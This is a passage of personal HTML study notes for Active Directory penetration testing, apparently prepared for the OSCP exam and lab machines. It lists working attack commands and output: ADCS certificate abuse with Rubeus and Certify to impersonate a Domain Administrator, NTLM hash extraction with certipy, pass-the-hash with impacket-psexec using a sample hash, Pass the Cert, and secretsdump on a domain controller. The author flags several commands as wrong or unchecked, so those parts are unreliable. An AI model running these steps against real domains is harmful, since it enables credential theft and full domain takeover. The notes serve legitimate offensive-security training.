class="subheading">Determine Hostname</span>: You need the Hostname for the target machine (i.e. the one you&#39;re currently using. Run <strong>hostname</strong> (e.g. DC01)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: After injecting the TGT &amp; verifying with <strong>klist</strong>, you have 3 options for local exploitation. </p><p></p><p><span style="color:#cdab8f;text-decoration:underline;">Fix these Commands</span>: These examples involve impersonating ca_svc to request a cert for ca_svc. This is pointless, unless it&#39;s for Persistence.</p><p></p><p>You actually want to impersonate ca_svc so you can request a certificate for a high privilege Domain account (i.e. Domain Administrator). <span style="color:#ff0000;">Modify these commands accordingly</span>.</p><p><ol><li><span class="subheading">Spawn Certify in a New Context</span>: <em>.\Rubeus.exe createnetonly /program:&quot;C:\Path\To\Certify.exe request /ca:DC01\sequel-DC01-CA /template:DunderMifflinAuthentication /kerberos&quot;</em></li></ol><em></em></p><p><em></em><ol><li><span class="subheading">Spawn Process with the Injected TGT Context</span> </li></ol></p><p></p><p><em>.\Rubeus.exe klist</em><em></em></p><p><em>.\Rubeus.exe tgtdeleg /ptt</em></p><p><ol><li><span class="subheading">Using createnetonly</span>: Rubeus <strong>createnetonly</strong> creates a new process with its own logon session, and Kerberos will use the ticket injected into that session, not current user&#39;s (e.g using ca_svc, not ryan’s session).</li></ol></p><p></p><p><em>.\Rubeus.exe asktgt /user:ca_svc /rc4:&lt;NTLM HASH&gt; /domain:sequel.local /ptt</em><em></em></p><p><em>.\Rubeus.exe createnetonly /program:&quot;cmd.exe&quot;</em></p><p></p><p><strong>{In New Shell}</strong> <em>.\Certify.exe request /ca:DC01\sequel-DC01-CA /template:DunderMifflinAuthentication /kerberos</em></p><p></p><p><a name="Auth via Certificate"></a><h2>Using Certificate for Authentication</h2></p><p><h3>Obtain NTLM Hash</h3><span style="color:#237522;"></span></p><p><span style="color:#237522;"></span>Use the PFX certificate file you requested. You can then use the NTLM for a PtH Attack (e.g. using <strong>evil-winrm</strong>, <strong>impacket-psexec</strong> to get SYSTEM, etc) or an OPtH Attack. This outputs LM &amp; NT hashes (typically only need NT hash).</p><p></p><p><em>certipy-ad auth -pfx administrator.pfx -domain sequel.htb</em></p><p></p><p><strong>[*] Got hash for &#39;administrator@sequel.htb&#39;: aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff</strong></p><p></p><p><em>impacket-psexec Administrator@sequel.htb -hashes aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff</em></p><p></p><p><h3>Pass the Cert (PtC)</h3></p><p>You can perform a <a href="https://www.thehacker.recipes/ad/movement/schannel/passthecert">Pass the Cert</a> Attack using <a href="https://github.com/AlmondOffSec/PassTheCert">passthecert.py</a> to spawn an interactive LDAP Shell or perform administrative actions.</p><p></p><p><h3>Local Authentication</h3></p><p>Specify the Domain user you want to authenticate as (probably <strong>Administrator</strong>) &amp; the PFX certificate file. </p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Does the PFX file have it&#39;s own password, unrelated to the account password? If so, will it be output if you used local exploitation methods for obtaining the cert? IDK fact check this.</p><p></p><p><em>.\Rubeus.exe asktgt /user:ca_svc /certificate:cert.pfx /password:&lt;pfx-password&gt; /ptt</em></p><p></p><p><h1>Manual Enumeration</h1></p><p>Whereas commands like <strong>net user bob </strong>or <strong>net group &quot;Sales Department&quot; </strong>will give you information in the context of the local machine, you can get domain information instead by appending <strong>/domain</strong>.</p><p></p><p><em>net user bob /domain</em></p><p></p><p><h2>★</h2><h2>Account Descriptions</h2></p><p>Accounts sometimes have sensitive info listed in fields like their Description. Check Local &amp; Domain Users. (is that Format-Table statement correct? should it be select statement? Also <strong>FL</strong> works better for overflowing output IMO)</p><p></p><p><em>Get-LocalUser | select *</em></p><p></p><p><em>Get-ADUser -Properties description -Filter {samAccountName -like &quot;*&quot;} | FT SamAccountName,Name,Description</em></p><p></p><p><h2>PowerSploit</h2></p><p>See section on <a href="PrivEsc--Windows_9.html#PowerSploit">PowerView</a> &amp; other modules.</p><p></p><p><h1>AD Lateral Movement Techniques</h1></p><p>[Win 112-]</p><p></p><p><a href="Pivoting--AD_Lateral_Movement_39.html">More information &amp; examples</a></p><p></p><p><h2>Use Case</h2></p><p><span style="color:#ff0000;">By def, </span><span style="color:#33d17a;">Local Administrators</span> have various ways to get RCE (e.g <span style="color:#ff0000;">WinRM</span> &amp; <span style="color:#ff0000;">RDP</span>). <span style="color:#ff0000;">If these are disabled</span> on the target machine, can use alternate methods like <span style="color:#ff0000;">WMI</span> or <span style="color:#ff0000;">DCOM</span> (My preference) which <span style="color:#ff0000;">utilize RPC</span> instead.</p><p></p><p>May be able to use a Lateral Movement technique, even for users who can&#39;t normally get RCE.</p><p></p><p><h2>Pivot</h2></p><p>mount /dev/sdc2 &amp; see <a href="file:///mnt/code/code/windows/powershell/">/mnt/code/code/windows/powershell/</a> for DCOM &amp; WMI methods.</p><p></p><p><h1>Tips</h1></p><p><h2>Domain Admin vs Local Admin</h2></p><p>Domain Admins != Local Admins. A <span style="color:#ff0000;">Local Admin gets RCE</span> (e.g RDP &amp; WinRM by def, be used for impacket-psexec, etc), &amp; will be detected by CME.</p><p></p><p>However, a <span style="color:#ff0000;">Domain Admin can</span> do things like <em><span style="color:#ff0000;">impacket-secretsdump</span></em><span style="color:#ff0000;"> on DC</span> (even if they can&#39;t get RCE).</p><p></p><p>Sometimes a Domain Admin has the same privs as a Local Admin (e.g. they can RCE)</p><p></p><p>On a <span style="color:#ff0000;">DC</span>, the <span style="color:#ff0000;">built-in Local Administrator</span> account is disabled by default &amp; <span style="color:#ff0000;">replaced with the Domain Administrator</span> account (which has Local Admin&#39;s privs). This means <span style="color:#ff0000;">hash for Local Administrator WON&#39;T work</span>!</p><p>	</p><p><h2>AD is still Windows</h2></p><p>Following Windows <a href="PrivEsc_8.html">PrivEsc</a> steps (even as SYSTEM) often can help with Pivoting in AD! (e.g Sensitive Files, etc).</p><p></p><p><h2>Top Level Domain</h2></p><p> <strong>.local</strong> is a common TLD for AD Domains. For exam, the Domain will likely be <strong>oscp.exam</strong></p><p> </p><p>For tools like impacket, you often need to <span style="color:#ff0000;">use the TLD for AD related purposes</span> even when the hostname is different. For example, </p><p></p><p><em>whoami</em></p><p><strong>site-dc\Administrator</strong></p><p></p><p><em>impacket-GetNPUsers site.lan/Administrator</em> ...</p></div>
</body>
</html>
